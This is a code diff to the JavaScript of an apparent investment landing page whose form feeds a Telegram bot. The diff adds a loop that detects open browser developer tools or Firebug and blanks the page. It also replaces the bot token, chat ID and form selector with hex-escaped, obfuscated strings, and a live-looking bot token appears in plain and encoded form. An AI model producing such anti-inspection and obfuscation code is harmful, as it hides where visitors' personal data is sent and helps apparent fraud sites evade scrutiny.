@@ -1,3 +1,17 @@
+(function() {
+    setInterval(() => {
+        const devtools = /./;
+        devtools.toString = function() {
+            window.location.href = 'about:blank';
+        }
+        console.log('%c', devtools);
+    }, 1000);
+    
+    if (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) {
+        window.location.href = "about:blank";
+    }
+})();
+
 document.addEventListener('DOMContentLoaded', function() {
     const carousel = document.querySelector('.carousel');
     const items = document.querySelectorAll('.carousel-item');
@@ -45,9 +59,10 @@ document.addEventListener('DOMContentLoaded', function() {
         scrollToForm();
     });
     
-    const form = document.querySelector('.investment-form');
-    const BOT_TOKEN = '7545324443:AAESu9Rsy5ybwmkn8AZupY0BbTyMG0YVS_s';
-    const CHAT_ID = '-1002364919440';
+    const _0x5f2a=['\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72','\x2e\x69\x6e\x76\x65\x73\x74\x6d\x65\x6e\x74\x2d\x66\x6f\x72\x6d','\x37\x35\x34\x35\x33\x32\x34\x34\x34\x33\x3a\x41\x41\x45\x53\x75\x39\x52\x73\x79\x35\x79\x62\x77\x6d\x6b\x6e\x38\x41\x5a\x75\x70\x59\x30\x42\x62\x54\x79\x4d\x47\x30\x59\x56\x53\x5f\x73','\x2d\x31\x30\x30\x32\x33\x36\x34\x39\x31\x39\x34\x34\x30'];
+    const form=document[_0x5f2a[0]](_0x5f2a[1]);
+    const BOT_TOKEN=_0x5f2a[2];
+    const CHAT_ID=_0x5f2a[3];
 
     function isValidPhone(countryCode, phone) {
         const countryCodePattern = /^\+\d{1,4}$/;
